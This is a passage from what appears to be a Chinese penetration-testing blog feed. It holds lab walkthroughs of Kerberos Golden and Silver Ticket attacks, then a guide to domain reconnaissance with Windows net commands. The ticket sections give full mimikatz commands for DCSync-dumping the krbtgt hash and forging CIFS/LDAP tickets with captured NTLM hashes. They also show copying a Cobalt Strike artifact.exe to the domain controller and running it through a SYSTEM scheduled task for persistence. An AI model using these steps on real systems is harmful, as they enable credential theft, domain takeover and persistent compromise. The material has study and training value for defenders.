/u</span>ser:krbtgt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010152736649.png" alt="image-20231010152736649"></p><p><img src="/img/image-20231010152811590.png" alt="image-20231010152811590"></p><p>得到krbtgt的ntlm hash：4d81c6ab6cabae0fc304cd309f601a0b</p><p>4、这个时候突然域控下线了，管理员发现的你在控制，把后门清理了</p><p><img src="/img/image-20231010153142329.png" alt="image-20231010153142329"></p><p><img src="/img/image-20231010153848759.png" alt="image-20231010153848759"></p><p>5、因为之前已经记录了关键信息，我们现在就可以伪造任意用户访问域控，windows 2008机器必须是域内用户或者system用户</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br></code></pre></td></tr></table></figure><p>使用cs制作黄金票据</p><p><img src="/img/image-20231010153946573.png" alt="image-20231010153946573"></p><p><img src="/img/image-20231010154044275.png" alt="image-20231010154044275"></p><p><img src="/img/image-20231010154226444.png" alt="image-20231010154226444"></p><p>6、使用dir 远程访问域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc.hack.com\c$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010154304566.png" alt="image-20231010154304566"></p><p>7、使用计划任务上线cs </p><p>copy当前控制的靶机的恶意文件到域控的C盘</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> <span class="hljs-keyword">copy</span> <span class="hljs-keyword">c</span>:\users\administrator\desktop\artifact.<span class="hljs-keyword">exe</span> \\dc.hack.<span class="hljs-keyword">com</span>\<span class="hljs-keyword">c</span>$<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010154917002.png" alt="image-20231010154917002"></p><p>设置计划任务到域控   名字test 开机启动 c:\artifact.exe  以system权限</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /create /s dc.hack.com /tn <span class="hljs-built_in">test</span> /sc onstart /tr c:\artifact.exe /ru system /f</span><br></code></pre></td></tr></table></figure><p>运行计划任务</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> schtasks /run /s dc.hack.com /i /tn <span class="hljs-string">&quot;test&quot;</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010155130795.png" alt="image-20231010155130795"></p><p>域控上线</p><p><img src="/img/image-20231010155137094.png" alt="image-20231010155137094"></p><h2 id="5-Silver-Ticket白银票据制作原理及利用方式"><a href="#5-Silver-Ticket白银票据制作原理及利用方式" class="headerlink" title="5.Silver Ticket白银票据制作原理及利用方式"></a>5.Silver Ticket白银票据制作原理及利用方式</h2><p><strong>本质：伪造ST</strong></p><h3 id="服务账号"><a href="#服务账号" class="headerlink" title="服务账号"></a>服务账号</h3><p>服务账号就是计算机名字+$用来管理服务的账号</p><h3 id="白银票据原理"><a href="#白银票据原理" class="headerlink" title="白银票据原理"></a>白银票据原理</h3><p><strong>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST</strong>。 在Kerberos认证的第三步，Client带着ST和 Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问 server上的指定服务了。所以我们只需要知道<strong>Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</strong></p><p><img src="/img/image-20231010161311015.png" alt="image-20231010161311015"></p><p>我们以去动物园举例</p><p><img src="/img/image-20231010161346581.png" alt="image-20231010161346581"></p><h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><h4 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h4><table><thead><tr><th>实验机器</th><th>IP地址</th></tr></thead><tbody><tr><td>windows Server 2012（域控）</td><td>10.210.100.10</td></tr><tr><td>windows Server 2008（域内成员）</td><td>10.210.100.20</td></tr><tr><td>windows Server 2003（域内成员）</td><td>10.210.100.30</td></tr></tbody></table><h4 id="实验前提-1"><a href="#实验前提-1" class="headerlink" title="实验前提"></a>实验前提</h4><p>1、已经控制了域控并且使用域管理员登录或者提权的system </p><p>我们的目的是去访问windows server 2003 的机器</p><p>条件如下：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-number">1.</span>域名<br><span class="hljs-number">2.</span>域sid<br><span class="hljs-number">3.</span>目标服务器名<br><span class="hljs-number">4.</span>可利用的服务<br><span class="hljs-number">5.</span>服务账号的NTML <span class="hljs-built_in">HASH</span><br><span class="hljs-number">6.</span>需要伪造的用户名<br></code></pre></td></tr></table></figure><h4 id="实验步骤-1"><a href="#实验步骤-1" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>控制域控</p><p>1、获取基本信息</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010163307144.png" alt="image-20231010163307144"></p><p><img src="/img/image-20231010163322321.png" alt="image-20231010163322321"></p><p>域名：hack.com  SID：S-1-5-21-2431442348-1717482385-2017137259</p><p>2、获取服务账号的ntlm hash值</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010163543546.png" alt="image-20231010163543546"></p><p>服务账号DC$的ntlm hash值：a2b973c420b7df773e05ed5d780cdc7c</p><p>3、伪造票据（CIFS共享服务）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br><br>mimikatz kerberos::golden /domain:hack.com /sid:S-1-5-21-2431442348-1717482385-2017137259<br>/target:dc.hack.com /service:cifs /rc4:a2b973c420b7df773e05ed5d780cdc7c /user:abcd /ptt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010163930167.png" alt="image-20231010163930167"></p><p><img src="/img/image-20231010164116810.png" alt="image-20231010164116810"></p><p>4、访问域控</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\dc.hack.com\c$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010164225754.png" alt="image-20231010164225754"></p><p>6、伪造票据（LDAP共享服务）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br>mimikatz kerberos::golden /domain:hack.com /sid:S-1-5-21-2431442348-1717482385-2017137259<br>/target:dc.hack.com /service:LDAP /rc4:a2b973c420b7df773e05ed5d780cdc7c /user:abcd /ptt<br></code></pre></td></tr></table></figure><p>7、查询域控的krbtgt（通过LDAP服务）</p><p>获取域控的krbtgt的ntlm hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz lsadump::dcsync /dc:dc.hack.com /domain:hack.com /user:krbtgt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010164633305.png" alt="image-20231010164633305"></p><p>此时又可以制作黄金票据 拿到域控权限</p><h4 id="控制PC-2003"><a href="#控制PC-2003" class="headerlink" title="控制PC-2003"></a>控制PC-2003</h4><p>1.获取基本信息</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">whoami</span> /user 获取域的sid值(去掉最后的‐500，500表示为administrator用户)</span><br><span class="hljs-keyword">shell</span><span class="language-bash"> net config workstation 查看域</span><br></code></pre></td></tr></table></figure><p>域名：hack.com  SID：S-1-5-21-2431442348-1717482385-2017137259</p><p>2、获取服务账号的ntlm hash值</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mimikatz sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010171348936.png" alt="image-20231010171348936"></p><p>ntlm hash:509a5497664e1415f80a550c0ba4b543</p><p>3、伪造票据（CIFS共享服务）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mimikatz kerberos::tgt 查票<br>mimikatz kerberos::purge 清票<br>shell klist 查票<br>shell klist purge 清票<br><br>mimikatz kerberos::golden /domain:hack.com /sid:S-1-5-21-2431442348-1717482385-2017137259<br>/target:PC-2003.hack.com /service:cifs /rc4:509a5497664e1415f80a550c0ba4b543 /user:abc /ptt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010171613721.png" alt="image-20231010171613721"></p><p>4、访问2003</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">dir</span> \\PC-2003.hack.com\c$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231010171802035.png" alt="image-20231010171802035"></p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集3-搜集域环境信息</title>
    <link href="/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%863-%E6%90%9C%E9%9B%86%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF/"/>
    <url>/2023/10/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%863-%E6%90%9C%E9%9B%86%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="1-收集域环境的基本信息"><a href="#1-收集域环境的基本信息" class="headerlink" title="1.收集域环境的基本信息"></a>1.收集域环境的基本信息</h2><h3 id="查询权限"><a href="#查询权限" class="headerlink" title="查询权限"></a>查询权限</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>1、本地普通用户:当前为本机的user用户</p><p><img src="/img/image-20231006202337163.png" alt="image-20231006202337163"></p><p>2、本地管理员用户:当前为本机的administrator</p><p><img src="/img/image-20231006202152713.png" alt="image-20231006202152713"></p><p>3、域内用户:当前为域内普通用户</p><p><img src="/img/image-20231006202440347.png" alt="image-20231006202440347"></p><p>4、域内用户:当前为hack域内的administrator用户</p><p><img src="/img/image-20231006202539873.png" alt="image-20231006202539873"></p><p>在这四种情况中。 </p><ul><li>如果当前内网中存在域,那么<strong>本地普通用户只能查询本机相关信息,不能查询域内信息</strong>. </li><li>而<strong>本地管理员用户和域内用户可以查询域内信息</strong>.</li></ul><p>其原理是:域内的所有查询都是通过域控制器实现的（基于LDAP协议）,而这个查询需要经过权限认证,所以,只有域用户才拥有这个权限;当域用户执行查询命令时,会自动使用Kerberos协议进行认证,无须额外输人账号和密码 </p><p>本地管理员Admmistrator权限可以直接提升为Ntauthority或System权限,因此,在域中,除普通用户外,所有的机器都有—个机器用户（用户名是机器名加上”$”）。在本质上,<strong>机器的system用户对应的就是域里面的机器用户所以,使用 System权限可以运行域内的查询命令</strong>。</p><img src="/img/image-20231006203037766.png" alt="image-20231006203037766" style="zoom:80%;" /><h3 id="①判断域是否存在"><a href="#①判断域是否存在" class="headerlink" title="①判断域是否存在"></a>①判断域是否存在</h3><p>获得了本机的相关信息后就要判断当前内网中是否存在域，如果当前内网中存在域,就需要判断所控主机是否在域内  下面罗列几种方法。</p><h4 id="1-ipconfig-all-命令"><a href="#1-ipconfig-all-命令" class="headerlink" title="1.ipconfig &#x2F;all 命令"></a>1.ipconfig &#x2F;all 命令</h4><p>执行ipconfig &#x2F;all命令,可以查看网关IP地址、DNS的IP地址,域名、本机是否和DNS服务器处于同一网段等信息</p><img src="/img/image-20231006203319206.png" alt="image-20231006203319206" style="zoom:67%;" /><p>然后,通过反向解析查询命令nslookup来解析域名的IP地址。用解析得到的IP地址进行对比判断域控制器和DNS服务器是否在同—台服务器上。</p><img src="/img/image-20231006203441819.png" alt="image-20231006203441819" style="zoom:67%;" /><h4 id="2-systeminfo"><a href="#2-systeminfo" class="headerlink" title="2.systeminfo"></a>2.systeminfo</h4><p>执行如下命令,”域”即域名,登录服务器”为域控制器  如果域为”WORKGROUP”,表示当前服务器不在域内</p><img src="/img/image-20231006203546030.png" alt="image-20231006203546030" style="zoom:67%;" /><h4 id="3-net-config-workstation"><a href="#3-net-config-workstation" class="headerlink" title="3.net config workstation"></a>3.net config workstation</h4><img src="/img/image-20231006203636097.png" alt="image-20231006203636097" style="zoom:67%;" /><h4 id="4-net-time-domain"><a href="#4-net-time-domain" class="headerlink" title="4.net time &#x2F;domain"></a>4.net time &#x2F;domain</h4><p>一般有3种情况：</p><p>1.存在域，但当前用户不是域用户（注意，<strong>当本地管理员administrator密码与域管相同时，可能能查询成功</strong>）</p><img src="/img/image-20231006204014077.png" alt="image-20231006204014077" style="zoom:80%;" /><p>2.存在域，并且当前用户是域用户（以PC的system用户为例，其相当于域控分配的机器用户）</p><img src="/img/image-20231006204134350.png" alt="image-20231006204134350" style="zoom:67%;" /><p>3.当前网络环境为工作组，不存在域</p><img src="/img/image-20231006204338791.png" alt="image-20231006204338791" style="zoom:67%;" /><p>确定了当前内网拥有的域,且所控制的主机在域内,就可以进行域内相关信息的收集了。介绍的查询命令在本质上都是通过LDAP协议到域控制器上进行查询的,所以在查询时需要进行权限认证。只有域用户才拥有此权限,本地用户无法运行本节介绍的查询命令( System 权限用户除外。在域中,除普通用户外,所有的机器都有一个机器用户,其用户名为机器名加上 “$”。 System权限用户对应的就是域里面的机器用户,所以System权限用户可以运行相关的查询命令)</p><h3 id="net命令详解"><a href="#net命令详解" class="headerlink" title="net命令详解"></a>net命令详解</h3><p>​NET命令是一个命令行命令，Net命令有很多函数用于实用和核查计算机之间的NetBIOS连接，可以查看我们的管理网络环境、服务、用户、登陆等信息内容；要想获得Net 的HELP可以</p><p>(1)在Windows下可以用图形的方式，开始- &gt;帮助-&gt;索引-&gt;输入NET；</p><p>(2)在COMMAND下可以用字符方式：NET &#x2F;?或NET或NET HELP取得相应的方法的帮助。 </p><p>所有Net命令接受选项&#x2F;yes和&#x2F;no(可缩写为&#x2F;y和&#x2F;n)。</p><p><img src="/img/image-20231007095000042.png" alt="image-20231007095000042"></p><h4 id="net-view"><a href="#net-view" class="headerlink" title="net view"></a>net view</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stata">作用：显示域列表、计算机列表或指定计算机的共享资源列表。<br>命令格式：`<span class="hljs-keyword">Net</span> <span class="hljs-keyword">view</span> [\\computername | /domain[:domainname]]`<br>有关参数说明：<br>‐ 键入不带参数的`<span class="hljs-keyword">net</span> <span class="hljs-keyword">view</span>`显示当前域的计算机列表<br>‐ `\\computername` 指定要查看其共享资源的计算机<br>‐ `/domain[:domainname]`指定要查看其可用计算机的域<br>例如：<span class="hljs-keyword">Net</span> <span class="hljs-keyword">view</span> \\GHQ查看GHQ计算机的共享资源列表。<br><span class="hljs-keyword">Net</span> <span class="hljs-keyword">view</span> /domain:XYZ 查看XYZ域中的机器列表<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007095623235.png" alt="image-20231007095623235"></p><img src="/img/image-20231007095637862.png" alt="image-20231007095637862" style="zoom:80%;" /><p><img src="/img/image-20231007104713878.png" alt="image-20231007104713878"></p><p><img src="/img/image-20231007095706446.png" alt="image-20231007095706446"></p><h4 id="net-user"><a href="#net-user" class="headerlink" title="net user"></a>net user</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">作用：添加或更改用户帐号或显示用户帐号信息。<br>命令格式：`Net <span class="hljs-keyword">user</span> [username [<span class="hljs-keyword">password</span> | *] [<span class="hljs-keyword">options</span>]] [/<span class="hljs-keyword">domain</span>]`<br>有关参数说明：<br>‐ 键入不带参数的Net <span class="hljs-keyword">user</span>查看计算机上的用户帐号列表<br>‐ username添加、删除、更改或查看用户帐号名<br>‐ <span class="hljs-keyword">password</span>为用户帐号分配或更改密码<br>‐ 提示输入密码<br>‐ `/<span class="hljs-keyword">domain</span>`在计算机主域的主域控制器中执行操作。<br>该参数仅在Windows NT <span class="hljs-keyword">Server</span> 域成员的 Windows NT Workstation 计算机上可用。默认情况下，Windows NT <span class="hljs-keyword">Server</span> 计算机在主域控制器中执行操作。注意：在计算机主域的主域控制器发生该动作。它可能不是登录域。<br>例如：`Net <span class="hljs-keyword">user</span> ghq123`查看用户GHQ123的信息。<br>net <span class="hljs-keyword">user</span> /<span class="hljs-keyword">domain</span>  查看域中的用户<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231007095939949.png" alt="image-20231007095939949"></p><h4 id="net-use"><a href="#net-use" class="headerlink" title="net use"></a>net use</h4><p>连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs r">命令格式：`Net use [devicename | *] [\\computername\sharename[\volume]] no&#125;]]` password<span class="hljs-operator">|</span><span class="hljs-operator">*</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">[[</span><span class="hljs-operator">/</span>delete<span class="hljs-punctuation">]</span><span class="hljs-operator">|</span> <span class="hljs-punctuation">[</span><span class="hljs-operator">/</span>persistent<span class="hljs-operator">:</span><span class="hljs-punctuation">&#123;</span>yes <span class="hljs-operator">|</span><br>有关参数说明：<br>‐ 键入不带参数的Net use列出网络连接<br>‐ devicename指定要连接到的资源名称或要断开的设备名称<br>‐ `\\computername\sharename`服务器及共享资源的名称<br>‐ password访问共享资源的密码<br>‐ <span class="hljs-operator">*</span>提示键入密码<br>‐ `/user`指定进行连接的另外一个用户<br>‐ `domainname`指定另一个域<br>‐ `username`指定登录的用户名<br>‐ `/home`将用户连接到其宿主目录<br>‐ `/delete`取消指定网络连接<br>‐ `/persistent`控制永久网络连接的使用。<br>例如：`Net use f: \\GHQ\TEMP` 将<span class="hljs-punctuation">\</span>GHQ<span class="hljs-punctuation">\</span>TEMP目录建立为<span class="hljs-built_in">F</span>盘<br>`Net use f: \GHQ\TEMP` <span class="hljs-operator">/</span>delete 断开连接。<br></code></pre></td></tr></table></figure><h4 id="net-time"><a href="#net-time" class="headerlink" title="net time"></a>net time</h4><p>使计算机的时钟与另一台计算机或域的时间同步。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">命令格式：`Net <span class="hljs-type">time</span> [\\computername | /<span class="hljs-keyword">domain</span>[:<span class="hljs-type">name</span>]] [/<span class="hljs-keyword">set</span>]`<br>有关参数说明：<br>‐ `\\computername`要检查或同步的服务器名<br>‐`/<span class="hljs-keyword">domain</span>[:<span class="hljs-type">name</span>]`指定要与其时间同步的域<br>‐ `/<span class="hljs-keyword">set</span>`使本计算机时钟与指定计算机或域的时钟同步。<br></code></pre></td></tr></table></figure><h4 id="net-start"><a href="#net-start" class="headerlink" title="net start"></a>net start</h4><p>启动服务，或显示已启动服务的列表</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">命令格式：`<span class="hljs-built_in">Net</span> <span class="hljs-built_in">start</span> service`<br></code></pre></td></tr></table></figure><h4 id="net-pause"><a href="#net-pause" class="headerlink" title="net pause"></a>net pause</h4><p>暂停正在运行的服务。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net <span class="hljs-keyword">pause</span> service`<br></code></pre></td></tr></table></figure><h4 id="net-continue"><a href="#net-continue" class="headerlink" title="net continue"></a>net continue</h4><p>重新激活挂起的服务。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net <span class="hljs-keyword">continue</span> service`<br></code></pre></td></tr></table></figure><h4 id="net-stop"><a href="#net-stop" class="headerlink" title="net stop"></a>net stop</h4><p>停止 Windows NT&#x2F;2000&#x2F;2003 网络服务。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">命令格式：<span class="hljs-string">`Net stop service`</span><br></code></pre></td></tr></table></figure><h4 id="Net-Statistics"><a href="#Net-Statistics" class="headerlink" title="Net Statistics"></a>Net Statistics</h4><p>显示本地工作站或服务器服务的统计记录。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net statistics [workstation | server]`<br>有关参数说明：<br>∙键入不带参数的Net statistics列出其统计信息可用的运行服务<br>∙`workstation`显示本地工作站服务的统计信息<br>∙`server`显示本地服务器服务的统计信息<br>例如：Net statistics server | more显示服务器服务的统计信息。<br></code></pre></td></tr></table></figure><h4 id="net-share"><a href="#net-share" class="headerlink" title="net share"></a>net share</h4><p>创建、删除或显示共享资源。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net share sharename=drive:path [/users:number | /unlimited] [/remark:</span><span class="hljs-string">&quot;text&quot;</span>]`<br>有关参数说明：<br>∙ 键入不带参数的Net share显示本地计算机上所有共享资源的信息<br>∙ `sharename`是共享资源的网络名称<br><span class="hljs-title">∙ `drive:</span>path`指定共享目录的绝对路径<br><span class="hljs-title">∙ `/users:</span>number`设置可同时访问共享资源的最大用户数<br>∙ `/unlimited`不限制同时访问共享资源的用户数<br><span class="hljs-title">∙ `/remark:</span><span class="hljs-string">&quot;text &quot;</span>`添加关于资源的注释，注释文字用引号引住<br><span class="hljs-title">例如： `Net share yesky=c:\temp /remark:</span><span class="hljs-string">&quot;my first share&quot;</span>`<br><span class="hljs-title">以yesky为共享名共享C:</span>\temp<br>`Net share yesky /delete`停止共享yesky目录<br></code></pre></td></tr></table></figure><h4 id="net-session"><a href="#net-session" class="headerlink" title="net session"></a>net session</h4><p>列出或断开本地计算机和与之连接的客户端的会话。</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs r">命令格式：`Net session [\\computername] [/delete]`<br>有关参数说明：<br>∙键入不带参数的Net session显示所有与本地计算机的会话的信息。<br>∙`\\computername`标识要列出或断开会话的计算机。<br>∙`/delete`结束与 `\computername` 计算机会话并关闭本次会话期间计算机的所有打开文件。如果省略<br>`\computername` 参数，将取消与本地计算机的所有会话。<br>例如：`Net session [url=file://\\GHQ]\\GHQ[/url]`要显示计算机名为GHQ的客户端会话信息列表。<br></code></pre></td></tr></table></figure><h4 id="net-send"><a href="#net-send" class="headerlink" title="net send"></a>net send</h4><p>向网络的其他用户、计算机或通信名发送消息。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net send &#123;name | * | /domain[:</span>name] | /users&#125; message`<br>有关参数说明：<br>∙`name`要接收发送消息的用户名、计算机名或通信名<br>∙* 将消息发送到组中所有名称<br><span class="hljs-title">∙`/domain[:</span>name]`将消息发送到计算机域中的所有名称<br>∙`/users`将消息发送到与服务器连接的所有用户<br>∙`message`作为消息发送的文本<br>例如：`Net send /users server will shutdown in <span class="hljs-number">10</span> minutes`.给所有连接到服务器的用户发送消息。<br></code></pre></td></tr></table></figure><h4 id="net-print"><a href="#net-print" class="headerlink" title="net print"></a>net print</h4><p>显示或控制打印作业及打印队列。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net print [\\computername ] job# [/hold | /release | /delete]`<br>有关参数说明：<br>∙`computername`共享打印机队列的计算机名<br>∙`sharename`打印队列名称<br>∙`job#`在打印机队列中分配给打印作业的标识号<br>∙`/hold`使用`job#`时，在打印机队列中使打印作业等待<br>∙`/release`释放保留的打印作业<br>∙`/delete`从打印机队列中删除打印作业<br><span class="hljs-title">例如：`Net print \\GHQ\HP8000列出[url=file:</span>//\\GHQ]\\GHQ[/url]`计算机上HP8000打印机队列的目录。<br></code></pre></td></tr></table></figure><h4 id="net-name"><a href="#net-name" class="headerlink" title="net name"></a>net name</h4><p>添加或删除消息名（有时也称别名），或显示计算机接收消息的名称列表。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">命令格式：`Net name [name [/add | /delete]]`<br>有关参数说明：<br>∙键入不带参数的Net name列出当前使用的名称<br>∙`name`指定接收消息的名称<br>∙`/add`将名称添加到计算机中<br>∙`/delete`从计算机中删除名称<br></code></pre></td></tr></table></figure><h4 id="net-localgroup"><a href="#net-localgroup" class="headerlink" title="net localgroup"></a>net localgroup</h4><p>添加、显示或更改本地组。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">命令格式：`Net localgroup groupname &#123;/add [/comment:</span><span class="hljs-string">&quot;text &quot;</span>] | /delete&#125; [/domain]`<br>有关参数说明：<br>∙键入不带参数的`Net localgroup`显示服务器名称和计算机的本地组名称<br>∙`groupname`要添加、扩充或删除的本地组名称<br><span class="hljs-title">∙`/comment:</span> <span class="hljs-string">&quot;text &quot;</span>`为新建或现有组添加注释<br>∙`/domain`在当前域的主域控制器中执行操作，否则仅在本地计算机上执行操作<br>∙`name [ 